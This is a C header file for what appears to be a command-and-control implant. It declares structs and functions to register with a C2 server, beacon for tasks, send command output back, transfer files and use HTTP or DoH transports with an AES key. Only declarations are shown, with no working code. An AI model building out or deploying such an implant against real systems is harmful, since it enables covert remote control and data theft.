#pragma once
#include <stdint.h>
#include <stddef.h>

// ── Task received from server ─────────────────────────────────────────────────

typedef struct {
    long long  id;
    char       type[64];
    char      *args;     // heap-allocated, free when done
    uint8_t   *payload;  // heap-allocated, NULL if empty
    size_t     payload_len;
} AgentTask;

// ── Agent state (singleton) ───────────────────────────────────────────────────

typedef struct {
    char    agent_id[64];
    uint8_t aes_key[32];
    int     has_key;
    int     uri_idx;
} AgentState;

extern AgentState g_agent;

// ── API ───────────────────────────────────────────────────────────────────────

// Register with C2. Returns 1 on success.
int  agent_register(void);

// Poll for tasks. Returns heap-allocated array; *count set to number of tasks.
// Caller must call tasks_free(tasks, count) when done.
AgentTask* agent_beacon(int *count);
void       tasks_free(AgentTask *tasks, int count);

// Send command result back to C2.
void agent_send_result(long long task_id, const char *output, const char *error);
int  agent_http_do(const char *method, const char *path,
                   const uint8_t *body, size_t body_len,
                   const char *extra_hdr,
                   uint8_t **resp_out, size_t *resp_len, int *status);
void agent_send_result_admin(long long task_id, const char *output, const char *error, int is_admin);

// File transfer
void     agent_upload_file(long long task_id, const char *filename,
                           const uint8_t *data, size_t data_len);
uint8_t* agent_download_file(const char *filename, size_t *out_len);

// Internal helpers exposed for transport modules
// Parse the decrypted tasks JSON into an AgentTask array.  Caller must tasks_free().
AgentTask* agent_parse_tasks(const uint8_t *plain, size_t plain_len, int *count);
// HTTP-only registration (used by DoH which delegates registration to HTTP).
int agent_http_register(void);

// JSON mini-parsers (used by transport modules)
int   agent_json_str(const char *json, const char *key, char *out, size_t out_sz);
char* agent_json_str_alloc(const char *json, const char *key);
long long agent_json_int(const char *json, const char *key);
const char* agent_json_next_obj(const char *p, const char **end);
